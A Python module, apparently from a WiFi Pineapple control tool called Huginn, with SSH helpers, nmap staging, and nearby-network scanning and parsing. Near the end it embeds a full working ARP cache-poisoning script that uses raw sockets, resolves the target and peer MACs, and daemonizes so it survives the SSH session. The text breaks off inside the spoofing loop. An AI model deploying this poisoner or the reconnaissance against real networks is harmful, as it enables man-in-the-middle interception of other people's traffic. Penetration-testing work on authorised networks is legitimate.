from __future__ import annotations

import difflib
import html as _html
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Any

from core.app_paths import captures_dir, logs_dir, reports_dir

_SCAN_CACHE: dict[str, Any] = {'timestamp': 0.0, 'result': None}

# Cache for Pineapple iface MACs. Refreshed lazily; very long TTL because the
# device's hardware addresses do not change at runtime.
_IFACE_MAC_CACHE: dict[str, Any] = {'timestamp': 0.0, 'macs': None}
_IFACE_MAC_CACHE_TTL_SEC = 3600


def get_pineapple_iface_macs(cfg: dict[str, Any]) -> set[str]:
    """Return the set of upper-case MAC addresses currently bound to any
    interface on the Pineapple host.

    Used by the deep-analysis report to exclude the Pineapple's own radios from
    observed_clients lists. Cached for an hour because hardware addresses do
    not change at runtime; failures return whatever is cached (or empty).
    """
    global _IFACE_MAC_CACHE
    now = time.time()
    cached = _IFACE_MAC_CACHE.get('macs')
    if cached is not None and (now - float(_IFACE_MAC_CACHE.get('timestamp', 0.0))) < _IFACE_MAC_CACHE_TTL_SEC:
        return set(cached)

    # `ip link show` is universally present on the Pineapple. The MACs we want
    # appear after `link/ether ` on every iface line. We grep for them via the
    # SSH transport so we don't depend on awk/sed availability.
    result = _run(cfg, "ip link show 2>/dev/null", timeout=10)
    macs: set[str] = set()
    if result.get('ok'):
        for token in re.findall(
            r'link/ether\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})',
            result.get('stdout', '') or '',
        ):
            mac = token.upper()
            # Skip the all-zeros placeholder some virtual ifaces report.
            if mac != '00:00:00:00:00:00':
                macs.add(mac)
        _IFACE_MAC_CACHE = {'timestamp': now, 'macs': set(macs)}
        return macs

    # Transport failure - return whatever we last cached (may be empty).
    return set(cached) if cached is not None else set()


def _pine_cfg(cfg: dict[str, Any]) -> dict[str, Any]:
    return cfg['pineapple'].get('pineapple', {})


def _ssh_base(cfg: dict[str, Any]) -> list[str]:
    p = _pine_cfg(cfg)
    host = str(p.get('host', '')).strip()
    user = str(p.get('user', 'root')).strip()
    identity = str(p.get('identity_file', '')).strip()
    if not host:
        raise ValueError('Missing pineapple.host in config/pineapple.yaml')
    cmd = [
        'ssh', '-T',
        '-o', 'BatchMode=yes',
        '-o', 'StrictHostKeyChecking=accept-new',
        '-o', 'ConnectTimeout=8',
        '-o', 'ServerAliveInterval=15',
        '-o', 'ServerAliveCountMax=3',
    ]
    if identity:
        cmd += ['-i', identity]
    cmd += [f'{user}@{host}']
    return cmd


def _run(cfg: dict[str, Any], remote_cmd: str, timeout: int = 25) -> dict[str, Any]:
    try:
        proc = subprocess.run(_ssh_base(cfg) + [remote_cmd], text=True, capture_output=True, timeout=timeout, check=False)
        return {
            'ok': proc.returncode == 0,
            'returncode': proc.returncode,
            'stdout': (proc.stdout or '').strip()[-60000:],
            'stderr': (proc.stderr or '').strip()[-30000:],
            'remote_cmd': remote_cmd,
            'timeout_sec': timeout,
        }
    except subprocess.TimeoutExpired as exc:
        def _as_text(v: Any) -> str:
            if v is None:
                return ''
            if isinstance(v, bytes):
                try:
                    return v.decode('utf-8', errors='replace')
                except Exception:
                    return ''
            return str(v)
        return {
            'ok': False,
            'error': f'TimeoutExpired after {timeout}s: {exc}',
            'failure_type': 'timeout',
            'timeout_sec': timeout,
            'stdout': _as_text(getattr(exc, 'stdout', '')).strip()[-60000:],
            'stderr': _as_text(getattr(exc, 'stderr', '')).strip()[-30000:],
            'remote_cmd': remote_cmd,
        }
    except Exception as exc:
        return {
            'ok': False,
            'error': f'{type(exc).__name__}: {exc}',
            'failure_type': 'transport_failure',
            'remote_cmd': remote_cmd,
            'timeout_sec': timeout,
        }


def _check_connectivity(cfg: dict[str, Any], timeout: int = 10) -> dict[str, Any]:
    """Quick SSH connectivity precheck before expensive operations.

    Returns {'ok': True} if the Pineapple is reachable, or
    {'ok': False, 'failure_type': 'transport_failure', 'error': '...'} otherwise.
    """
    result = _run(cfg, 'echo OK', timeout=timeout)
    if result.get('ok') and 'OK' in result.get('stdout', ''):
        return {'ok': True}
    return {
        'ok': False,
        'error': result.get('error') or result.get('stderr') or 'Pineapple unreachable',
        'failure_type': 'transport_failure',
    }


_VALID_IFACE_RE_NMAP = re.compile(r'^[A-Za-z0-9._\-]+$')


def _validate_interface(iface: str) -> str | None:
    """Return a safe interface name or None if invalid."""
    if not iface:
        return None
    s = str(iface).strip()
    if _VALID_IFACE_RE_NMAP.fullmatch(s):
        return s
    return None


def _validate_scan_target(target: str) -> str | None:
    """Accept IPv4, IPv4/CIDR, or IPv4 range like 10.0.0.1-254.

    Reject anything containing shell metacharacters or non-IP chars.
    """
    import ipaddress as _ipaddr
    if not target:
        return None
    t = str(target).strip()
    if not re.fullmatch(r'[0-9a-fA-F:.\-/]+', t):
        return None
    try:
        _ipaddr.ip_network(t, strict=False)
        return t
    except ValueError:
        pass
    try:
        _ipaddr.ip_address(t)
        return t
    except ValueError:
        pass
    if re.fullmatch(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}', t):
        return t
    return None


def _pineapple_nmap_installed(cfg: dict[str, Any]) -> dict[str, Any]:
    """Probe whether nmap is installed on the Pineapple."""
    probe = _run(cfg, 'command -v nmap >/dev/null 2>&1 && echo OK || echo MISSING', timeout=8)
    if probe.get('error') and not probe.get('stdout'):
        return {
            'ok': False,
            'error': f"Could not probe for nmap: {probe.get('error')}",
            'failure_type': 'transport_failure',
        }
    if 'MISSING' in (probe.get('stdout', '') or ''):
        return {
            'ok': False,
            'error': 'nmap is not installed on the Pineapple. Install with: opkg update && opkg install nmap-ssl',
            'failure_type': 'dependency_missing',
            'dependency': 'nmap',
        }
    return {'ok': True}


def _pineapple_interface_info(cfg: dict[str, Any], iface: str) -> dict[str, Any]:
    """Return {ok, ipv4, cidr, prefix, interface} or a descriptive failure dict."""
    q = shlex.quote(iface)
    cmd = (
        f'echo __ADDR__; ip -4 -o addr show dev {q} 2>/dev/null; '
        f'echo __LINK__; ip -o link show {q} 2>/dev/null; '
        f'echo __IWINFO__; iwinfo {q} info 2>/dev/null || true'
    )
    r = _run(cfg, cmd, timeout=10)
    stdout = r.get('stdout', '') or ''
    if r.get('error') and not stdout:
        return {
            'ok': False,
            'error': f"Could not query {iface}: {r.get('error')}",
            'failure_type': 'transport_failure',
            'interface': iface,
        }
    # Example line: "2: wlan2    inet 192.168.X.X/24 brd 192.168.X.255 scope global wlan2"
    m = re.search(r'\binet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)\b', stdout)
    if not m:
        return {
            'ok': False,
            'error': f'{iface} has no IPv4 address. The Pineapple is not connected to an upstream network on this interface.',
            'failure_type': 'interface_no_ipv4',
            'interface': iface,
            'stdout_excerpt': stdout[-1500:],
        }
    return {
        'ok': True,
        'ipv4': m.group(1),
        'cidr': f'{m.group(1)}/{m.group(2)}',
        'prefix': int(m.group(2)),
        'interface': iface,
        'raw_excerpt': stdout[-1500:],
    }


def _pineapple_route_to_target(cfg: dict[str, Any], target: str, iface: str) -> dict[str, Any]:
    """Verify that the Pineapple's route to target goes via iface.

    Uses `ip route get <probe>` with a representative host from the target
    network. Returns {ok, outgoing_interface, error, failure_type, route_output}.
    """
    import ipaddress as _ipaddr
    probe_ip: str | None = None
    try:
        net = _ipaddr.ip_network(target, strict=False)
        hosts = list(net.hosts())
        if hosts:
            probe_ip = str(hosts[0])
        else:
            probe_ip = str(net.network_address)
    except ValueError:
        try:
            _ipaddr.ip_address(target)
            probe_ip = target
        except ValueError:
            return {'ok': True, 'skipped': True, 'reason': 'target_not_parseable_as_ip_or_cidr'}

    cmd = (
        f'echo __GET__; ip route get {shlex.quote(probe_ip)} 2>&1; '
        f'echo __TABLE__; ip route 2>/dev/null'
    )
    r = _run(cfg, cmd, timeout=10)
    stdout = r.get('stdout', '') or ''
    if r.get('error') and not stdout:
        return {
            'ok': False,
            'error': f"Could not query route: {r.get('error')}",
            'failure_type': 'transport_failure',
        }
    # Parse "ip route get" output: "192.168.X.X dev wlan2 src 192.168.X.X ..."
    get_section = stdout.split('__TABLE__', 1)[0]
    m = re.search(r'\bdev\s+([A-Za-z0-9._\-]+)', get_section)
    if m:
        outgoing_iface = m.group(1)
        if outgoing_iface != iface:
            return {
                'ok': False,
                'error': (
                    f'No route to {target} from {iface}. The kernel chose outgoing '
                    f'interface {outgoing_iface} for {probe_ip}.'
                ),
                'failure_type': 'wrong_route_interface',
                'expected_interface': iface,
                'actual_interface': outgoing_iface,
                'route_output': get_section.strip()[-1500:],
            }
        return {'ok': True, 'outgoing_interface': iface, 'probe_ip': probe_ip}
    # Fallback: check if iface appears in the route table at all
    if iface in stdout:
        return {'ok': True, 'inferred_from_route_table': True, 'probe_ip': probe_ip}
    return {
        'ok': False,
        'error': (
            f'No route to {target} from {iface}. The Pineapple may not be '
            f'connected to this subnet via {iface}.'
        ),
        'failure_type': 'no_route',
        'route_output': stdout[-1500:],
    }


def _pineapple_gateway_for_iface(cfg: dict[str, Any], iface: str) -> str | None:
    """Try to find the default gateway reachable through iface."""
    q = shlex.quote(iface)
    cmd = (
        f"ip route show dev {q} 2>/dev/null | awk '/default via/{{print $3; exit}}'; "
        f"ip route 2>/dev/null | awk '/^default/ && / dev " + iface + r"( |$)/{print $3; exit}'"
    )
    r = _run(cfg, cmd, timeout=8)
    for line in (r.get('stdout', '') or '').splitlines():
        line = line.strip()
        if re.fullmatch(r'\d+\.\d+\.\d+\.\d+', line):
            return line
    return None


def _run_remote_nmap_stage(
    cfg: dict[str, Any],
    stage_name: str,
    nmap_cmd: str,
    timeout: int,
) -> dict[str, Any]:
    """Run a single remote nmap stage and return a structured result dict."""
    result = _run(cfg, f'sh -lc {shlex.quote(nmap_cmd)}', timeout=timeout)
    stdout = result.get('stdout', '') or ''
    stderr = result.get('stderr', '') or ''
    return {
        'stage': stage_name,
        'ok': bool(result.get('ok')),
        'cmd': nmap_cmd,
        'stdout': stdout,
        'stderr': stderr,
        'returncode': result.get('returncode'),
        'error': result.get('error'),
        'failure_type': result.get('failure_type'),
        'timeout_sec': timeout,
    }


def _best_stage_error(stage: dict[str, Any], fallback: str) -> str:
    """Compose a descriptive error string from a stage result, never empty."""
    parts: list[str] = [fallback]
    err = stage.get('error')
    stderr = (stage.get('stderr') or '').strip()
    stdout = (stage.get('stdout') or '').strip()
    rc = stage.get('returncode')
    ftype = stage.get('failure_type')
    if ftype:
        parts.append(f'failure_type={ftype}')
    if err:
        parts.append(str(err))
    if stderr:
        parts.append(f'stderr: {stderr[-400:]}')
    elif stdout:
        parts.append(f'stdout tail: {stdout[-400:]}')
    if rc is not None and rc != 0:
        parts.append(f'returncode={rc}')
    cmd = stage.get('cmd')
    if cmd:
        parts.append(f'cmd: {cmd}')
    return ' | '.join(p for p in parts if p)


def _extract_nmap_xml_document(raw: str) -> str | None:
    """Return a clean Nmap XML document extracted from noisy SSH stdout.

    The Pineapple's login shell prints an ASCII/MOTD banner before the actual
    Nmap output, and sometimes trailing text after ``</nmaprun>``. This helper
    locates the XML document boundaries and returns only the XML, or ``None``
    if no recognizable document is present.
    """
    if not raw:
        return None
    text = raw
    start_idx = text.find('<?xml')
    if start_idx < 0:
        start_idx = text.find('<nmaprun')
    if start_idx < 0:
        return None
    trimmed = text[start_idx:]
    end_idx = trimmed.rfind('</nmaprun>')
    if end_idx >= 0:
        trimmed = trimmed[: end_idx + len('</nmaprun>')]
    # If we only saw <?xml but no <nmaprun, it is not an nmap document.
    if '<nmaprun' not in trimmed:
        return None
    return trimmed


def _parse_nmap_runstats(xml_text: str) -> dict[str, Any]:
    """Best-effort extraction of ``runstats/hosts`` counters without ET parsing.

    Used to detect the silent-failure case where XML is present and reports
    hosts up > 0 but ElementTree could not parse it.
    """
    m = re.search(
        r'<hosts[^>]*\bup="(\d+)"[^>]*\btotal="(\d+)"',
        xml_text or '',
    )
    if not m:
        m2 = re.search(r'<hosts[^>]*\bup="(\d+)"', xml_text or '')
        if not m2:
            return {}
        return {'up': int(m2.group(1))}
    return {'up': int(m.group(1)), 'total': int(m.group(2))}


def _parse_nmap_xml(raw_or_xml: str) -> dict[str, Any]:
    """Parse nmap -oX output, tolerating SSH banner/MOTD noise.

    Returns {live_hosts, ports_by_host, services_by_host, os_by_host,
    parse_error, parser_warning, runstats}. ``live_hosts`` is a list of dicts
    {ip, mac, vendor, reason, hostname} for hosts with status=up.
    """
    import xml.etree.ElementTree as _ET
    live_hosts: list[dict[str, Any]] = []
    ports_by_host: dict[str, list[dict[str, Any]]] = {}
    services_by_host: dict[str, list[dict[str, Any]]] = {}
    os_by_host: dict[str, dict[str, Any]] = {}

    xml_text = _extract_nmap_xml_document(raw_or_xml or '')
    if not xml_text:
        return {
            'live_hosts': [], 'ports_by_host': {}, 'services_by_host': {},
            'os_by_host': {}, 'parse_error': 'no XML content', 'runstats': {},
        }
    runstats = _parse_nmap_runstats(xml_text)
    try:
        root = _ET.fromstring(xml_text)
    except _ET.ParseError as exc:
        warning = None
        if runstats.get('up', 0) > 0:
            warning = (
                f'parser_failed: runstats reports {runstats["up"]} host(s) up '
                f'but XML could not be parsed by ElementTree ({exc}).'
            )
        return {
            'live_hosts': [], 'ports_by_host': {}, 'services_by_host': {},
            'os_by_host': {}, 'parse_error': str(exc), 'runstats': runstats,
            'parser_warning': warning,
        }
    for host_elem in root.findall('host'):
        status = host_elem.find('status')
        state = status.get('state') if status is not None else None
        reason = status.get('reason') if status is not None else None
        ipv4 = None
        mac = None
        vendor = None
        for addr in host_elem.findall('address'):
            atype = addr.get('addrtype')
            if atype == 'ipv4' and not ipv4:
                ipv4 = addr.get('addr')
            elif atype == 'mac':
                mac = addr.get('addr')
                vendor = addr.get('vendor')
        hostname = None
        hostnames_elem = host_elem.find('hostnames')
        if hostnames_elem is not None:
            hn = hostnames_elem.find('hostname')
            if hn is not None:
                hostname = hn.get('name')
        if not ipv4:
            continue
        if state == 'up':
            live_hosts.append({
                'ip': ipv4, 'mac': mac, 'vendor': vendor,
                'reason': reason, 'hostname': hostname,
            })
        ports_elem = host_elem.find('ports')
        if ports_elem is not None:
            host_ports: list[dict[str, Any]] = []
            host_services: list[dict[str, Any]] = []
            for port in ports_elem.findall('port'):
                p_state = port.find('state')
                s_state = p_state.get('state') if p_state is not None else None
                s_reason = p_state.get('reason') if p_state is not None else None
                p_service = port.find('service')
                svc: dict[str, Any] = {}
                if p_service is not None:
                    svc = {
                        'name': p_service.get('name'),
                        'product': p_service.get('product'),
                        'version': p_service.get('version'),
                        'extrainfo': p_service.get('extrainfo'),
                        'conf': p_service.get('conf'),
                        'cpe': [c.text for c in p_service.findall('cpe') if c.text],
                    }
                try:
                    port_num = int(port.get('portid', 0))
                except ValueError:
                    port_num = 0
                entry = {
                    'port': port_num,
                    'protocol': port.get('protocol', ''),
                    'state': s_state,
                    'reason': s_reason,
                    'service': svc,
                }
                host_ports.append(entry)
                if svc and s_state == 'open':
                    host_services.append({
                        'port': port_num,
                        'protocol': port.get('protocol', ''),
                        **svc,
                    })
            if host_ports:
                ports_by_host[ipv4] = host_ports
            if host_services:
                services_by_host[ipv4] = host_services
        os_elem = host_elem.find('os')
        if os_elem is not None:
            matches: list[dict[str, Any]] = []
            for m in os_elem.findall('osmatch'):
                try:
                    acc = int(m.get('accuracy', 0) or 0)
                except ValueError:
                    acc = 0
                matches.append({'name': m.get('name'), 'accuracy': acc})
            classes: list[dict[str, Any]] = []
            for oc in os_elem.findall('osclass'):
                try:
                    acc = int(oc.get('accuracy', 0) or 0)
                except ValueError:
                    acc = 0
                classes.append({
                    'type': oc.get('type'), 'vendor': oc.get('vendor'),
                    'osfamily': oc.get('osfamily'), 'osgen': oc.get('osgen'),
                    'accuracy': acc,
                })
            if matches or classes:
                os_by_host[ipv4] = {
                    'matches': matches[:5],
                    'classes': classes[:5],
                    'best': matches[0] if matches else None,
                }
    parser_warning = None
    if runstats.get('up', 0) > 0 and not live_hosts:
        parser_warning = (
            f'parser_warning: runstats reports {runstats["up"]} host(s) up '
            f'but parser extracted 0 live hosts from XML.'
        )
    return {
        'live_hosts': live_hosts, 'ports_by_host': ports_by_host,
        'services_by_host': services_by_host, 'os_by_host': os_by_host,
        'runstats': runstats, 'parser_warning': parser_warning,
    }


def _parse_nmap_live_hosts_text(stdout: str) -> list[dict[str, Any]]:
    """Fallback text parser for -sn output when XML could not be parsed."""
    hosts: list[dict[str, Any]] = []
    current: dict[str, Any] | None = None
    for line in stdout.splitlines():
        m = re.match(r'Nmap scan report for (?:([^\s]+)\s+)?\(?(\d+\.\d+\.\d+\.\d+)\)?', line)
        if m:
            if current and current.get('ip'):
                hosts.append(current)
            current = {
                'ip': m.group(2),
                'hostname': (m.group(1) or None),
                'mac': None, 'vendor': None, 'reason': None,
            }
            continue
        if current:
            mm = re.match(r'MAC Address:\s*([0-9A-Fa-f:]{17})\s*\(([^)]*)\)', line.strip())
            if mm:
                current['mac'] = mm.group(1).upper()
                current['vendor'] = mm.group(2).strip()
                continue
            rm = re.search(r'Host is up.*?\(\s*([^)]+)\)', line)
            if rm:
                current['reason'] = rm.group(1).strip()
    if current and current.get('ip'):
        hosts.append(current)
    return hosts


def pineapple_status(cfg: dict[str, Any]) -> dict[str, Any]:
    return _run(cfg, 'uname -a; uptime; df -h; ip addr; iw dev 2>/dev/null || true')


def pineapple_wifi_snapshot(cfg: dict[str, Any]) -> dict[str, Any]:
    return _run(cfg, 'ip link | grep -E "wlan|mon" -n; iw dev 2>/dev/null || true; iwinfo 2>/dev/null || true')


def pineapple_logs(cfg: dict[str, Any], lines: int = 200) -> dict[str, Any]:
    n = max(50, min(int(lines), 2000))
    return _run(cfg, f'logread 2>/dev/null | tail -n {n}')


def _scp_from_remote(cfg: dict[str, Any], remote_path: str, local_path: str, timeout: int = 90) -> dict[str, Any]:
    p = _pine_cfg(cfg)
    host = str(p.get('host', '')).strip()
    user = str(p.get('user', 'root')).strip()
    identity = str(p.get('identity_file', '')).strip()
    local_file = Path(local_path).expanduser().resolve()
    local_file.parent.mkdir(parents=True, exist_ok=True)
    cmd = ['scp', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=accept-new', '-o', 'ConnectTimeout=8']
    if identity:
        cmd += ['-i', identity]
    cmd += [f'{user}@{host}:{remote_path}', str(local_file)]
    try:
        proc = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout, check=False)
    except Exception as exc:
        return {'ok': False, 'error': str(exc), 'remote_path': remote_path, 'local_path': str(local_file)}
    return {
        'ok': proc.returncode == 0,
        'returncode': proc.returncode,
        'stdout': (proc.stdout or '').strip(),
        'stderr': (proc.stderr or '').strip(),
        'remote_path': remote_path,
        'local_path': str(local_file),
        'error': None if proc.returncode == 0 else ((proc.stderr or proc.stdout or 'scp failed').strip()),
    }


def _scan_raw(cfg: dict[str, Any], refresh: bool = False, cache_ttl_sec: int = 6) -> dict[str, Any]:
    global _SCAN_CACHE
    if not refresh and _SCAN_CACHE['result'] is not None:
        age = time.time() - float(_SCAN_CACHE['timestamp'])
        if age <= cache_ttl_sec:
            cached = dict(_SCAN_CACHE['result'])
            cached['from_cache'] = True
            cached['cache_age_sec'] = round(age, 2)
            return cached
    scan_cmd = r"""sh -lc '
for IFACE in wlan2 wlan1 wlan1mon wlan0; do
  if command -v iwinfo >/dev/null 2>&1; then
    OUT="$(iwinfo "$IFACE" scan 2>/dev/null)" || true
    if [ -n "$OUT" ]; then
      echo "INTERFACE:$IFACE"
      echo "$OUT"
      exit 0
    fi
  fi
done
for IFACE in wlan2 wlan1 wlan1mon wlan0; do
  OUT="$(iw dev "$IFACE" scan 2>/dev/null)" || true
  if [ -n "$OUT" ]; then
    echo "INTERFACE:$IFACE"
    echo "$OUT"
    exit 0
  fi
done
exit 1
'""".strip()
    result = _run(cfg, scan_cmd, timeout=45)
    if result.get('ok'):
        _SCAN_CACHE['timestamp'] = time.time()
        _SCAN_CACHE['result'] = dict(result)
        result['from_cache'] = False
        result['cache_age_sec'] = 0.0
    return result


def _extract_interface(raw: str) -> str | None:
    m = re.search(r'^INTERFACE:([^\n\r]+)$', raw, flags=re.MULTILINE)
    return m.group(1).strip() if m else None


def _split_scan_blocks(raw: str) -> list[str]:
    cleaned = re.sub(r'^INTERFACE:[^\n\r]+\n?', '', raw).strip()
    if not cleaned:
        return []
    return [b.strip() for b in re.split(r'\n(?=(?:Cell \d+ - |BSS [0-9A-Fa-f:]{17}))', cleaned) if b.strip()]


def _parse_network_block(block: str) -> dict[str, Any] | None:
    ssid = None
    m = re.search(r'ESSID:\s*"([^"]*)"', block)
    if m:
        ssid = m.group(1).strip()
    if ssid is None:
        m = re.search(r'^\s*SSID:\s*(.+?)\s*$', block, flags=re.MULTILINE)
        if m:
            ssid = m.group(1).strip()
    bssid = None
    m = re.search(r'Address:\s*([0-9A-Fa-f:]{17})', block) or re.search(r'BSS\s+([0-9A-Fa-f:]{17})', block)
    if m:
        bssid = m.group(1)
    channel = None
    m = re.search(r'Channel:\s*(\d+)', block) or re.search(r'primary channel:\s*(\d+)', block, flags=re.IGNORECASE)
    if m:
        channel = int(m.group(1))
    signal_dbm = None
    m = re.search(r'Signal:\s*(-?\d+(?:\.\d+)?)\s*dBm', block, flags=re.IGNORECASE) or re.search(r'signal:\s*(-?\d+(?:\.\d+)?)\s*dBm', block, flags=re.IGNORECASE)
    if m:
        signal_dbm = float(m.group(1))
    security = None
    if re.search(r'WPA3|SAE', block, flags=re.IGNORECASE):
        security = 'WPA3/SAE'
    elif re.search(r'WPA2|PSK|802\.11i', block, flags=re.IGNORECASE):
        security = 'WPA2/PSK'
    elif re.search(r'WEP', block, flags=re.IGNORECASE):
        security = 'WEP'
    elif re.search(r'Encryption:\s*none', block, flags=re.IGNORECASE):
        security = 'Open'
    if ssid is None and not bssid:
        return None
    return {
        'ssid': ssid if ssid is not None else '<hidden>',
        'bssid': bssid,
        'channel': channel,
        'signal_dbm': signal_dbm,
        'security': security,
        'wps_present': True if re.search(r'WPS', block, flags=re.IGNORECASE) else None,
        'pmf_present': True if re.search(r'802\.11w|PMF|MFP', block, flags=re.IGNORECASE) else None,
        'hidden_ssid': True if ssid == '' else False if ssid is not None else None,
        'raw_excerpt': block[:2000],
    }


def _parse_scan_output(raw: str) -> tuple[str | None, list[dict[str, Any]]]:
    interface = _extract_interface(raw)
    networks = []
    seen = set()
    for block in _split_scan_blocks(raw):
        parsed = _parse_network_block(block)
        if not parsed:
            continue
        key = (str(parsed.get('ssid', '')).strip(), parsed.get('bssid'))
        if key in seen:
            continue
        seen.add(key)
        networks.append(parsed)
    networks.sort(key=lambda x: (x.get('signal_dbm') is None, -(float(x['signal_dbm'])) if x.get('signal_dbm') is not None else 9999.0, str(x.get('ssid', ''))))
    return interface, networks


def pineapple_nearby_ssids(cfg: dict[str, Any], limit: int = 10) -> dict[str, Any]:
    result = _scan_raw(cfg)
    if not result.get('ok'):
        return result
    interface, networks = _parse_scan_output(result['stdout'])

    # Suppress Pineapple-owned / self-generated APs from the default nearby
    # list.  The Pineapple's own BSSIDs use the Hak5 OUI (00:13:37) and any
    # MACs bound to its interfaces.  These are not real "nearby networks."
    pineapple_macs = get_pineapple_iface_macs(cfg)
    pineapple_macs_lower = {m.lower() for m in pineapple_macs}
    _HAK5_OUI = '00:13:37'

    def _is_pineapple_self(net: dict) -> bool:
        bssid = str(net.get('bssid', '')).strip().lower()
        if not bssid:
            return False
        if bssid in pineapple_macs_lower:
            return True
        if bssid.startswith(_HAK5_OUI.lower()):
            return True
        return False

    filtered: list[dict] = []
    ssids: list[str] = []
    for net in networks:
        if _is_pineapple_self(net):
            continue
        ssid = str(net.get('ssid', '')).strip()
        if ssid and ssid != '<hidden>' and ssid not in ssids:
            ssids.append(ssid)
        filtered.append(net)

    return {
        'ok': True,
        'interface': interface,
        'count': len(ssids),
        'ssids': ssids[:limit],
        'networks': filtered[:limit],
        'raw_excerpt': result['stdout'][:4000],
        'from_cache': result.get('from_cache', False),
        'cache_age_sec': result.get('cache_age_sec', 0.0),
    }


def pineapple_analyze_ssid(cfg: dict[str, Any], ssid: str, refresh: bool = False) -> dict[str, Any]:
    ssid = (ssid or '').strip()
    if not ssid:
        return {'ok': False, 'error': 'No SSID provided'}
    result = _scan_raw(cfg, refresh=refresh)
    if not result.get('ok'):
        return result
    interface, networks = _parse_scan_output(result['stdout'])
    exact = next((n for n in networks if str(n.get('ssid', '')).strip().lower() == ssid.lower()), None)
    corrected_from: str | None = None
    if not exact:
        # Fuzzy match: try to resolve obvious typos like SpetrumSetup → SpectrumSetup
        available = [str(n.get('ssid', '')).strip() for n in networks if str(n.get('ssid', '')).strip()]
        close = difflib.get_close_matches(ssid, available, n=1, cutoff=0.82)
        if close:
            corrected_from = ssid
            ssid = close[0]
            exact = next((n for n in networks if str(n.get('ssid', '')).strip() == ssid), None)
    if not exact:
        return {
            'ok': False,
            'error': f'SSID not found in current scan: {ssid}',
            'interface': interface,
            'available_ssids': [str(n.get('ssid', '')).strip() for n in networks if str(n.get('ssid', '')).strip()],
        }
    out = dict(exact)
    out.update({
        'ok': True,
        'ssid': str(exact.get('ssid', ssid)).strip(),
        'confirmed_from_scan': True,
        'interface': interface,
        'from_cache': result.get('from_cache', False),
        'cache_age_sec': result.get('cache_age_sec', 0.0),
    })
    if corrected_from:
        out['corrected_from'] = corrected_from
        out['note'] = f'Typo corrected: "{corrected_from}" resolved to "{ssid}"'
    return out


_HUGINN_ARP_POISONER_SCRIPT = r'''#!/usr/bin/env python3
"""Huginn pure-Python ARP poisoner.

Bidirectional ARP cache poisoning over raw AF_PACKET sockets. No external
dependencies: works with python3-light on OpenWrt where dsniff/scapy/ettercap
are unavailable in the package feed.

Daemonizes via the canonical double-fork pattern so it survives the SSH
session that launches it.
"""
from __future__ import annotations
import argparse
import fcntl
import os
import socket
import struct
import sys
import time

ETH_P_ARP = 0x0806
ARP_REQUEST = 1
ARP_REPLY = 2
SIOCGIFHWADDR = 0x8927
SIOCGIFADDR = 0x8915


def _ifreq(name):
    return struct.pack('256s', name.encode()[:15])


def get_iface_mac(name):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        info = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR, _ifreq(name))
    return info[18:24]


def get_iface_ip(name):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        info = fcntl.ioctl(s.fileno(), SIOCGIFADDR, _ifreq(name))
    return info[20:24]


def mac_str(b):
    return ':'.join('%02x' % x for x in b)


def build_arp(eth_dst, eth_src, op, sha, spa, tha, tpa):
    eth = eth_dst + eth_src + struct.pack('!H', ETH_P_ARP)
    arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op) + sha + spa + tha + tpa
    return eth + arp


def open_arp_socket(iface):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    s.bind((iface, 0))
    return s


def resolve_mac(sock, my_mac, my_ip, target_ip, timeout=4.0):
    bcast = b'\xff' * 6
    req = build_arp(bcast, my_mac, ARP_REQUEST, my_mac, my_ip, b'\x00' * 6, target_ip)
    deadline = time.time() + timeout
    sock.send(req)
    sock.settimeout(0.5)
    last_send = time.time()
    while time.time() < deadline:
        if time.time() - last_send > 1.0:
            sock.send(req)
            last_send = time.time()
        try:
            data, _ = sock.recvfrom(65535)
        except socket.timeout:
            continue
        if len(data) < 42:
            continue
        if data[12:14] != b'\x08\x06':
            continue
        op = struct.unpack('!H', data[20:22])[0]
        if op != ARP_REPLY:
            continue
        sender_mac = data[22:28]
        sender_ip = data[28:32]
        if sender_ip == target_ip:
            return sender_mac
    return None


def daemonize(pidfile, logfile):
    if os.fork() != 0:
        for _ in range(40):
            if os.path.exists(pidfile):
                break
            time.sleep(0.1)
        os._exit(0)
    os.setsid()
    if os.fork() != 0:
        os._exit(0)
    pid = os.getpid()
    with open(pidfile, 'w') as f:
        f.write(str(pid))
    fnull = open('/dev/null', 'rb')
    log = open(logfile, 'ab', buffering=0)
    os.dup2(fnull.fileno(), 0)
    os.dup2(log.fileno(), 1)
    os.dup2(log.fileno(), 2)


def log(msg):
    sys.stdout.write('[%s] %s\n' % (time.strftime('%Y-%m-%d %H:%M:%S'), msg))
    sys.stdout.flush()


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--iface', required=True)
    p.add_argument('--target', required=True)
    p.add_argument('--peer', required=True)
    p.add_argument('--interval', type=float, default=2.0)
    p.add_argument('--log', required=True)
    p.add_argument('--pidfile', required=True)
    args = p.parse_args()

    daemonize(args.pidfile, args.log)
    log('starting iface=%s target=%s peer=%s interval=%s pid=%d'
        % (args.iface, args.target, args.peer, args.interval, os.getpid()))

    try:
        my_mac = get_iface_mac(args.iface)
        my_ip = get_iface_ip(args.iface)
    except OSError as exc:
        log('FATAL: iface read failed: %s' % exc)
        sys.exit(1)
    try:
        sock = open_arp_socket(args.iface)
    except OSError as exc:
        log('FATAL: AF_PACKET open failed: %s' % exc)
        sys.exit(1)

    target_ip_b = socket.inet_aton(args.target)
    peer_ip_b = socket.inet_aton(args.peer)

    log('my_mac=%s my_ip=%s' % (mac_str(my_mac), socket.inet_ntoa(my_ip)))
    target_mac = resolve_mac(sock, my_mac, my_ip, target_ip_b)
    peer_mac = resolve_mac(sock, my_mac, my_ip, peer_ip_b)
    log('target_mac=%s peer_mac=%s'
        % (mac_str(target_mac) if target_mac else 'UNKNOWN',
           mac_str(peer_mac) if peer_mac else 'UNKNOWN'))
    if not target_mac and not peer_mac:
        log('WARN: neither host responded to ARP; broadcasting spoof anyway')

    sock.settimeout(None)
    bcast = b'\xff' * 6
    n = 0
    re_resolve_at = time.time() + 60.0
    while True:
        t_dst = target_mac or bcast
        p_dst = peer_mac or bcast
